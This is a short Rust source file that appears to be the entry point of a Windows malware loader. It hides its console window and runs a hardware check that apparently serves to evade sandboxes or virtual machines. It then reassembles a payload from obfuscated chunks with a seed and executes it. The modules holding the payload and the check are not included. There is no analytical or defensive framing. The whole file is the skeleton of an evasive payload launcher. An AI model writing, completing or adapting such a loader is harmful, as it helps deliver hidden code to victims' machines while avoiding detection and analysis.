#![windows_subsystem = "windows"]

mod chunks;
mod hardware;
mod payload;

use windows::core::Result;

fn main() -> Result<()> {
    if !hardware::check_hardware_authenticity() {
        std::process::exit(1);
    }

    let payload = payload::reassemble_with_seed(chunks::SEED);

    if payload.len() < 64 {
        return Err(windows::core::Error::from_win32());
    }

    payload::execute_payload(&payload)
}
